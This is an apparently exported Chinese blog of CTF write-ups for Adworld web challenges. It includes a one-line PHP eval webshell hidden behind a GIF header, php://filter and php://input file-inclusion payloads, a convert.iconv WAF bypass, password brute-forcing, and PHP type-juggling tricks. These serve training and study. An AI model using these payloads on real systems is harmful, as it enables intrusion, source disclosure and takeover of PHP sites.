auto_prepend_file=a.jpg\n上传a.jpg，内容为\nGIF89a&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;\n这里也涨知识了，在文件内容头部添加GIF89a居然也可以？\n\n接着上传图片马\n\nF12查看文件去向，原因是你上传的图片马会被该网站同目录下的正常php文件所包含，因此你要知道你在上传图片之后，被哪个php文件包含\n\n接着我们蚁剑连接即可\n\n成功找到flag\n\n当然我们也可以访问该网址进行手动探索\n\n\n成功找到flag，在这里也遇到个神奇的问题，我在上传一段时间后，该木马文件失效了，这里也不知道是何原因\n\n参考文章：\n复现wp\n基础知识文章参考\n","categories":["攻防世界"]},{"title":"攻防世界-fileinclude","url":"/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileinclude/","content":"题目描述：\n无\n题目解题：\n简单的文件包含题目，但是我刚看到该页面的时候一脸懵，代码呢？？？，看了看wp发现最基本的查看源代码步骤忘了…\n\n我们开始审计代码，这道题就是让我们设置一个language变量的cookie并将其值传给lan，如果该lan变量存在，我们就可以包含一个可控的php文件，很明显这里我们令lan为读取响应文件源码的代码即可，payload如下：\nlanguage=php://filter/convert.base64-encode/resource=flag   //字符串拼接即可构造处flag.php\n\nbase64解码即可\n\n拿到flag\n参考文章：\n复现参考：\nPHP伪协议知识参考：\n","categories":["攻防世界"]},{"title":"攻防世界-weak_auth","url":"/2023/07/27/weak_auth/","content":"题目描述：\n小宁写了一个登陆验证页面，随手就设了一个密码。\n题目解题：\n打开页面发现如下图是一个简单的登录页面\n\n我们随便输一组账号密码看看\n\n发现其在弹出一个密码错误的边框后，页面跳到check.php页面，查看源代码发现\n\n这大概率就是要bp爆破了，我们不急，现在登录页面尝试几手\n\n我们此次修改了账户名，发现如上弹框，这说明我们必须以admin身份登录，因此只需要抓包爆破password即可\n\n\n如图设置好后开始爆破\n\n如图发现明显点，点击看看响应\n\n找到flag\n","categories":["攻防世界"]},{"title":"攻防世界-fileclude","url":"/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileclude/","content":"题目描述：\n好多file呀！\n题目解题：\n依旧是一个文件上传，我们进行代码审计\nWRONG WAY! &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&quot;file1&quot;]) &amp;&amp; isset($_GET[&quot;file2&quot;]))&#123;    $file1 = $_GET[&quot;file1&quot;];    $file2 = $_GET[&quot;file2&quot;];    if(!empty($file1) &amp;&amp; !empty($file2))    &#123;        if(file_get_contents($file2) === &quot;hello ctf&quot;)        &#123;            include($file1);        &#125;    &#125;    else        die(&quot;NONONO&quot;);&#125; \n流程为如果get传参file1与file2并且其中的file2参数等于hello ctf，则包含include，否则退出程序\n很明显变量file2可以采用php://input协议绕过，且内容为指定内容，变量file1我们采取PHP伪协议读取源码即可，这里已经有提示要我们读取flag.php文件\npayload如下：\n?file1=php://filter/convert.base64-encode/resource=flag.php&amp;file2=php://input\n这里file2的内容要用bp抓包添加hello ctf，直接用hackbar无法成功，因为在post栏中的内容要为键值对的形式方可执行\n如图成功得到flag，base64解码即可\n\n\n参考文章：\nwp可参考\n","categories":["攻防世界"]},{"title":"攻防世界-easyphp","url":"/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easyphp/","content":"题目描述：\neasyphp\n题目解题：\n一道《简单的》PHP特性题\n代码有点高深，对于菜鸡的我，有点审不过来，就能申的就申\n &lt;?phphighlight_file(__FILE__);//高亮文件$key1 = 0;$key2 = 0;$a = $_GET[&#x27;a&#x27;];   //同下，get传参$b = $_GET[&#x27;b&#x27;];if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)&#123;//如果a不为空，且a取证大于指定数字，长度小于3进入下一步    if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))&#123; //如果b存在，且b的md5编码的指定部分等于指定字符串，进入下一部        $key1 = 1;  //将该变量赋值为1        &#125;else&#123;            die(&quot;Emmm...再想想&quot;);        &#125;    &#125;else&#123;    die(&quot;Emmm...&quot;);&#125;$c=(array)json_decode(@$_GET[&#x27;c&#x27;]);   //接受一个 JSON 编码的字符串C并且把它转换为 PHP 值写到数组array中if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)&#123;//如果C是数组，且$c[&quot;m&quot;]不是数字或数字字符串且$c[&quot;m&quot;]大于2022    if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))&#123;//如果c[&quot;n&quot;]是数组 且c[&quot;n&quot;]的元素值为2 且$c[&quot;n&quot;][0])是数组        $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);//d在数组c[&quot;n&quot;]中搜索&quot;DGGJ&quot;，如果匹配成功返回键值        $d === false?die(&quot;no...&quot;):NULL;//d 为 false的话，挂掉，输出no...        foreach($c[&quot;n&quot;] as $key=&gt;$val)&#123;//检查数组c[&quot;n&quot;]            $val===&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;//如果c[&quot;n&quot;]是&quot;DGGJ&quot;，挂掉，输出no......        &#125;        $key2 = 1;//赋值key2=1；    &#125;else&#123;        die(&quot;no hack&quot;);    &#125;&#125;else&#123;    die(&quot;no&quot;);&#125;if($key1 &amp;&amp; $key2)&#123;//若这两个变量存在，则回显flag    include &quot;Hgfks.php&quot;;    echo &quot;You&#x27;re right&quot;.&quot;\\n&quot;;    echo $flag;&#125;?&gt; Emmm...\n1 根据第9行 if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)   在变量a中写入整数值大于6000000且长度小于3的字符串。2 根据第10行 if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))   在变量b中写入末尾md5为&#x27;8b184b&#x27;的字符串，我在印象里有MD5碰撞专用的网站；3 根据第20行 if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)   在数组c的成员m中写入不是数字或数组字符串且值大于2022的4 根据第21行 if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))   在数组c的成员n中写入元素值为2且c[&quot;n&quot;][0])是数组的5 根据第22行 $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);    如果&quot;DGGJ&quot;与$c[&quot;n&quot;]）的搜素结果匹配，且c[&quot;n&quot;]不可以是&quot;DGGJ&quot;本身6 根据第19行 $c=(array)json_decode(@$_GET[&#x27;c&#x27;]);   数组c除了上述要求外，还需要是JSON 编码。\n第一个：查看官方文档发现1e10数字很大，但要求我们长度小于4，那我们试试1e9\n\n很明显可以的，成功绕过\n第二个：应该是md5碰撞，不过这里写脚本更合适，但太菜了，就看看大佬如何写的吧\n&lt;?phpfor($b=1;$b&lt;=100000;$b++)&#123; //b从1到100000   if(preg_match(&#x27;/^8b184b/&#x27;,substr(md5($b),-6,6)))&#123; //匹配md5b的末尾为8b184b      echo $b; //输出b      echo &quot;\\n&quot;;      echo md5($b); //输出md5      echo &quot;\\n&quot;;   &#125;&#125;?&gt;\n代码也很简单（但我依旧想不到-.-）采用一个简单的正则表达式，如果匹配则输出b，我们运行一下看看\n\n第三个：if(is_array($c) &amp;&amp; !is_numeric(@$c[“m”]) &amp;&amp; $c[“m”] &gt; 2022)\n首先我们知道c是一个数组，且有两个元素即c=array(‘m’,‘n’);\n先套用JSON编码运行一遍，就是把c[“m”]='9001 '写成c={“m”:“9001a”}；这里注意双引号，因为根据官方教程，写单引号JSON是不正确的\n\n第四个与第五个：if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))\n$d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]); \narray_search绕过可以参考博文：CTF中常见的 PHP 弱类型漏洞总结 - 北极边界安全团队 - 博客园 (cnblogs.com)\n示例代码如下：\n&lt;?phpif(!is_array($_GET[&#x27;test&#x27;]))&#123;exit();&#125;$test=$_GET[&#x27;test&#x27;];for($i=0;$i&lt;count($test);$i++)&#123;    if($test[$i]===&quot;admin&quot;)&#123;        echo &quot;error&quot;;        exit();    &#125;    $test[$i]=intval($test[$i]);&#125;if(array_search(&quot;admin&quot;,$test)===0)&#123;    echo &quot;flag&quot;;&#125;else&#123;    echo &quot;false&quot;;&#125;?&gt;\n这段代码的意思就是先判断是不是数组，然后在把数组中的内容一个个进行遍历，所有内容都不能等于admin,类型也必须相同，然后转化成int型，然后再进行比较如果填入值与admin相同，则返回flag,如何绕过呢？\n基本思路还是不变，因为用的是三个等于号，所以说“= =”号这个方法基本不能用，那就用第二条思路，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。所以payload：test[]=0。\n​\t因此这道题我们可以\n我们直接为c[n0]赋予空值数组，保证可以通过is_array($c[“n”][0])的判定，c[n1]赋予空值，即c=[[],0];0的话，由于这里是强比较那么0肯定不等于false，便成功绕过\n最终c赋值为c=&#123;&quot;m&quot;:&quot;9001 &quot;,&quot;n&quot;:[[0],0]&#125;\npayload为：\n?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;9001 &quot;,&quot;n&quot;:[[0],0]&#125;\n\n得到flag\n参考文章：\nwp参考\n","categories":["攻防世界"]},{"title":"攻防世界-file_include","url":"/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/","content":"题目描述：\n怎么读取文件呢？\n题目解题：\n简单的PHP代码\n &lt;?phphighlight_file(__FILE__);    include(&quot;./check.php&quot;);    if(isset($_GET[&#x27;filename&#x27;]))&#123;        $filename  = $_GET[&#x27;filename&#x27;];        include($filename);    &#125;?&gt;\n以为题目很简单，我直接尝试php://filter协议读取源代码，却发现做了waf，于是蒙了，所以参考了大佬的wp\n思路就是根据题目逐步猜测其过滤的内容，输入如下两个payload发现：\nhttp://61.147.171.105:64434/?filename=php://fil1ter/con1vert.ba1se64-e1ncode/resource=index.phphttp://61.147.171.105:64434/?filename=php://filter/convert.base64-e1ncode/resource=index.php第一个payload，提示不见了，第二个payload依然有提示，说明base64-encode关键词被过滤；直接在网上搜文件包含绕过base64-encode,最终找到了convert.iconv.* 绕过.\nconvert.iconv.* 绕过\n这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。\niconv — 字符串按要求的字符编码来转换\nconvery.iconv.*的使用有两种方法:\nconvert.iconv..\nconvert.iconv./\n\n和就是编码方式，有如下几种(以下不全)：\n1 UCS-4*2 UCS-4BE3 UCS-4LE*4 UCS-25 UCS-2BE6 UCS-2LE7 UTF-32*8 UTF-32BE*9 UTF-32LE*10 UTF-16*11 UTF-16BE*12 UTF-16LE*13 UTF-714 UTF7-IMAP15 UTF-8*16 ASCII*17 EUC-JP*18 SJIS*19 eucJP-win*20 SJIS-win*21 ISO-2022-JP22 ISO-2022-JP-MS23 CP93224 CP5193225 BASE64\n具体可参考官方手册https://www.php.net/manual/en/mbstring.supported-encodings.php\n本题中我们逐个进行尝试，最终尝试http://61.147.171.105:64434/?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=index.php可以进行绕过。\n通过读取index.php，发现没有提示文字。\n读取check.php，发现过滤文件\n\n直接读取flag.php看看，成功得到\n\n参考文章：\n基础PHP伪协议知识参考\nwp参考\n","categories":["攻防世界"]}]